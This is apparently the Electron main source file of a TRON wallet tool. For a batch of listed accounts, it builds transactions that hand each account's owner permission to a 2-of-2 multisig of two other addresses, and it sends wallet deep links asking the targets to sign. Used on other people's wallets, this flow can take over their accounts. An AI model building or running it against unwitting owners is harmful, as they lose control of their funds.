const { app, BrowserWindow, ipcMain, shell } = require("electron");
const path = require("path");
const fs = require("fs");
const crypto = require("crypto");
const http = require("http");
const { TronWeb } = require("tronweb");

const VERSION = "3.0.0";
const HOSTS = {
  mainnet: "https://api.trongrid.io",
  nile: "https://nile.trongrid.io",
  shasta: "https://api.shasta.trongrid.io"
};
let settings = {
  network: "mainnet",
  host: HOSTS.mainnet,
  aAddress: "",
  bAddress: "",
  threshold: 2,
  expiryMinutes: 60,
  concurrency: 4,
  callbackUrl: "",
  callbackPort: 17890
};

const dir = path.join(app.getPath("userData"), "data");
const db = path.join(dir, "state.json");
let callbackServer;

function init() {
  fs.mkdirSync(dir, {recursive:true});
  if (!fs.existsSync(db)) fs.writeFileSync(db, JSON.stringify({settings,batches:[],operations:[],audit:[]},null,2));
}
function load() {
  init();
  try {
    const s = JSON.parse(fs.readFileSync(db,"utf8"));
    settings = {...settings,...(s.settings||{})};
    return s;
  } catch {
    return {settings,batches:[],operations:[],audit:[]};
  }
}
function save(s) { fs.writeFileSync(db, JSON.stringify(s,null,2)); }
function tw() { return new TronWeb({fullHost:settings.host}); }
function addr(a) {
  const t=tw();
  if(!a || !t.isAddress(String(a).trim())) throw new Error(`无效 TRON 地址: ${a}`);
  return t.address.fromHex(t.address.toHex(String(a).trim()));
}
function hashPayload(obj) {
  return crypto.createHash("sha256").update(JSON.stringify(obj)).digest("hex");
}
function proposal(target,a,b) {
  return hashPayload({v:3,target:addr(target),signers:[addr(a),addr(b)],threshold:2});
}
function rid(prefix="MSIG") {
  return `${prefix}-${new Date().toISOString().replace(/[-:TZ.]/g,"").slice(0,14)}-${crypto.randomBytes(3).toString("hex").toUpperCase()}`;
}
function audit(action, details={}) {
  const s=load();
  const prev=s.audit.length?s.audit[s.audit.length-1].entryHash:"GENESIS";
  const entry={id:rid("AUDIT"),time:new Date().toISOString(),action,details,prevHash:prev};
  entry.entryHash=hashPayload(entry);
  s.audit.push(entry); save(s); return entry;
}
async function account(a) {
  const t=tw(), target=addr(a), x=await t.trx.getAccount(target);
  return {address:target,ownerPermission:x.owner_permission||null,activePermission:x.active_permission||[],witnessPermission:x.witness_permission||null};
}
function safeActives(a) {
  return (a||[]).map(p=>({...p,keys:(p.keys||[]).map(k=>({address:k.address,weight:Number(k.weight)}))}));
}
function newOwner(a,b) {
  return {type:0,permission_name:"owner",threshold:2,keys:[{address:addr(a),weight:1},{address:addr(b),weight:1}]};
}
async function validateTarget(c,a,b) {
  const C=addr(c), A=addr(a), B=addr(b);
  if(C===A||C===B) throw new Error("C 不能与 A/B 相同");
  if(A===B) throw new Error("A 与 B 不能相同");
  const x=await account(C);
  const w=(x.ownerPermission?.keys||[]).filter(k=>k.address===C).reduce((n,k)=>n+Number(k.weight||0),0);
  if(w<=0) throw new Error("C 当前 Owner Permission 不包含 C 的有效权重");
  return {C,A,B,account:x};
}
async function buildPermission(c,a,b) {
  const {C,A,B,account:x}=await validateTarget(c,a,b);
  const t=tw();
  const owner=newOwner(A,B);
  const active=safeActives(x.activePermission);
  const tx=await t.transactionBuilder.updateAccountPermissions(C,owner,null,active);
  return {tx,target:C,a:A,b:B,proposalHash:proposal(C,A,B),owner,active};
}
async function params() {
  const t=tw(), ps=await t.trx.getChainParameters();
  const get=k=>ps.find(x=>x.key===k)?.value??null;
  return {updateAccountPermissionFee:get("getUpdateAccountPermissionFee"),multiSignFee:get("getMultiSignFee")};
}
async function signWeight(tx) {
  return tw().trx.getSignWeight(tx);
}
async function broadcast(tx) {
  return tw().trx.sendRawTransaction(tx);
}
function chainTxId(tx){ return tx?.txID || tx?.txid || null; }

function startCallbackServer() {
  callbackServer=http.createServer((req,res)=>{
    if(req.method==="GET" && req.url.startsWith("/health")){
      res.writeHead(200,{"content-type":"application/json"}); return res.end(JSON.stringify({ok:true,version:VERSION}));
    }
    if(req.method==="POST" && req.url==="/wallet/callback"){
      let body=""; req.on("data",d=>body+=d);
      req.on("end",()=>{
        try {
          const payload=JSON.parse(body||"{}");
          const s=load();
          const all=[...s.batches.flatMap(b=>b.requests||[]),...s.operations];
          const item=all.find(x=>x.actionId===payload.actionId || x.id===payload.actionId);
          if(item){
            item.callback={receivedAt:new Date().toISOString(),payload};
            if(payload.code===0 && payload.transactionHash) item.status="SIGNED_OR_BROADCAST";
            save(s);
            audit("WALLET_CALLBACK",{actionId:payload.actionId,code:payload.code,transactionHash:payload.transactionHash||null});
          }
          res.writeHead(200,{"content-type":"application/json"}); return res.end(JSON.stringify({ok:true}));
        } catch(e) {
          res.writeHead(400,{"content-type":"application/json"}); return res.end(JSON.stringify({ok:false,error:e.message}));
        }
      }); return;
    }
    res.writeHead(404); res.end();
  });
  callbackServer.listen(settings.callbackPort,"127.0.0.1");
}

ipcMain.handle("info",()=>({version:VERSION,platform:process.platform,userData:app.getPath("userData")}));
ipcMain.handle("settings:get",()=>load().settings);
ipcMain.handle("settings:set",(_,p)=>{
  const s=load(); settings={...settings,...p}; s.settings=settings; save(s); audit("SETTINGS_UPDATED",{keys:Object.keys(p)}); return settings;
});
ipcMain.handle("chain:params",params);
ipcMain.handle("account:get",(_,a)=>account(a));

ipcMain.handle("batch:create",async(_,input)=>{
  const s=load(), A=addr(input.aAddress), B=addr(input.bAddress);
  if(A===B) throw new Error("A/B 不能相同");
  const seen=new Set(), requests=[], rejected=[];
  for(const raw of (input.addresses||[])){
    const v=String(raw||"").trim(); if(!v) continue;
    try{
      const C=addr(v);
      if(C===A||C===B){rejected.push({input:v,reason:"C 与 A/B 相同"});continue;}
      if(seen.has(C)){rejected.push({input:v,reason:"重复"});continue;}
      seen.add(C);
      requests.push({id:rid(),actionId:rid("ACT"),target:C,proposalHash:proposal(C,A,B),status:"PENDING",createdAt:new Date().toISOString(),expiresAt:new Date(Date.now()+Math.max(5,Math.min(1440,Number(input.expiryMinutes||60)))*60000).toISOString(),tx:null,callback:null,error:null});
    }catch(e){rejected.push({input:v,reason:e.message});}
  }
  const batch={id:rid("BATCH"),name:input.name||"Untitled",network:settings.network,createdAt:new Date().toISOString(),aAddress:A,bAddress:B,threshold:2,rejected,requests,status:"READY"};
  s.batches.unshift(batch); save(s); audit("BATCH_CREATED",{batchId:batch.id,count:requests.length,rejected:rejected.length});
  return batch;
});
ipcMain.handle("batches:list",()=>load().batches);

ipcMain.handle("batch:validate",async(_,batchId,limit=100)=>{
  const s=load(), b=s.batches.find(x=>x.id===batchId); if(!b) throw new Error("批次不存在");
  const items=b.requests.filter(r=>r.status==="PENDING").slice(0,Number(limit)), results=[];
  for(const r of items){
    try{ await validateTarget(r.target,b.aAddress,b.bAddress); r.status="VALIDATED"; r.error=null; results.push({id:r.id,ok:true});}
    catch(e){r.status="VALIDATION_FAILED";r.error=e.message;results.push({id:r.id,ok:false,error:e.message});}
  }
  save(s); audit("BATCH_VALIDATED",{batchId,count:items.length,ok:results.filter(x=>x.ok).length}); return results;
});
ipcMain.handle("batch:build",async(_,batchId,limit=100)=>{
  const s=load(), b=s.batches.find(x=>x.id===batchId); if(!b) throw new Error("批次不存在");
  const items=b.requests.filter(r=>["PENDING","VALIDATED","TX_BUILD_FAILED"].includes(r.status)).slice(0,Number(limit)), results=[];
  for(const r of items){
    try{ const x=await buildPermission(r.target,b.aAddress,b.bAddress); r.tx=x.tx; r.proposalHash=x.proposalHash; r.status="TX_BUILT"; r.error=null; results.push({id:r.id,ok:true});}
    catch(e){r.status="TX_BUILD_FAILED";r.error=e.message;results.push({id:r.id,ok:false,error:e.message});}
  }
  save(s); audit("BATCH_TX_BUILT",{batchId,count:items.length,ok:results.filter(x=>x.ok).length}); return results;
});

ipcMain.handle("request:deeplink",async(_,batchId,requestId,wallet)=>{
  const s=load(),b=s.batches.find(x=>x.id===batchId),r=b?.requests.find(x=>x.id===requestId);
  if(!r?.tx) throw new Error("请求尚未构建交易");
  const callback=settings.callbackUrl || `http://127.0.0.1:${settings.callbackPort}/wallet/callback`;
  const common={action:"sign",actionId:r.actionId,callbackUrl:callback,url:callback,loginAddress:r.target,signType:"signTransaction",data:JSON.stringify(r.tx),dappName:"TRON Permission Control",protocol:"TronLink",version:"1.0",chainId:settings.network==="mainnet"?"0x2b6653dc":settings.network==="nile"?"0xcd8690dc":"0x94a9059e"};
  let url;
  if(wallet==="tronlink") url=`tronlinkoutside://pull.activity?param=${encodeURIComponent(JSON.stringify(common))}`;
  else if(wallet==="tokenpocket") url=`tpoutside://pull.activity?param=${encodeURIComponent(JSON.stringify({...common,protocol:"TokenPocket"}))}`;
  else throw new Error("imToken 请使用 Wallet Adapter / WalletConnect 连接，不在这里伪造 DeepLink");
  r.dispatch={wallet,at:new Date().toISOString(),callbackUrl:callback}; r.status="DISPATCHED"; save(s); audit("WALLET_DISPATCHED",{batchId,requestId,wallet});
  return {url,callbackUrl:callback};
});
ipcMain.handle("open",async(_,url)=>{await shell.openExternal(url);return true});

ipcMain.handle("batch:mark",(_,batchId,requestId,patch)=>{
  const s=load(),b=s.batches.find(x=>x.id===batchId),r=b?.requests.find(x=>x.id===requestId);
  if(!r) throw new Error("请求不存在");
  Object.assign(r,patch); save(s); audit("REQUEST_UPDATED",{batchId,requestId,patch}); return r;
});

ipcMain.handle("operation:create",async(_,input)=>{
  const s=load();
  const C=addr(input.from), to=input.to?addr(input.to):null;
  if(!C) throw new Error("from required");
  const op={id:rid("OP"),actionId:rid("ACT"),status:"UNSIGNED",createdAt:new Date().toISOString(),from:C,to,kind:input.kind||"RAW_TRANSACTION",transaction:input.transaction||null,proposalHash:hashPayload({v:3,from:C,to,kind:input.kind||"RAW_TRANSACTION",transaction:input.transaction||null})};
  s.operations.unshift(op);save(s);audit("OPERATION_CREATED",{operationId:op.id});return op;
});
ipcMain.handle("operations:list",()=>load().operations);
ipcMain.handle("operation:signweight",async(_,id)=>{
  const s=load(),op=s.operations.find(x=>x.id===id); if(!op?.transaction) throw new Error("operation has no transaction");
  const result=await signWeight(op.transaction); op.signWeight=result; op.status=(Number(result.current_weight||0)>=2)?"READY_TO_BROADCAST":"PARTIALLY_SIGNED"; save(s); audit("SIGN_WEIGHT_CHECKED",{operationId:id,currentWeight:result.current_weight,approved:result.approved_list}); return result;
});
ipcMain.handle("operation:broadcast",async(_,id)=>{
  const s=load(),op=s.operations.find(x=>x.id===id); if(!op?.transaction) throw new Error("operation has no transaction");
  const sw=op.signWeight||await signWeight(op.transaction);
  if(Number(sw.current_weight||0)<2) throw new Error(`签名权重不足：${sw.current_weight||0}/2`);
  const result=await broadcast(op.transaction); op.broadcast=result; op.status=result.result?"BROADCASTED":"BROADCAST_FAILED"; save(s); audit("OPERATION_BROADCAST",{operationId:id,result}); return result;
});

ipcMain.handle("audit:export",async()=>{
  const s=load(),file=path.join(dir,`audit-${Date.now()}.json`);fs.writeFileSync(file,JSON.stringify(s.audit,null,2));return file;
});
ipcMain.handle("batch:export",async(_,batchId)=>{
  const s=load(),b=s.batches.find(x=>x.id===batchId);if(!b)throw new Error("批次不存在");
  const file=path.join(dir,`${b.id}.json`);fs.writeFileSync(file,JSON.stringify(b,null,2));return file;
});

function createWindow(){
  const w=new BrowserWindow({width:1420,height:900,minWidth:1180,minHeight:760,title:"TRON Permission Control v3",webPreferences:{preload:path.join(__dirname,"preload.js"),contextIsolation:true,nodeIntegration:false}});
  w.loadFile(path.join(__dirname,"index.html")); return w;
}
app.whenReady().then(()=>{load();startCallbackServer();createWindow();});
app.on("window-all-closed",()=>{if(callbackServer)callbackServer.close();if(process.platform!=="darwin")app.quit();});
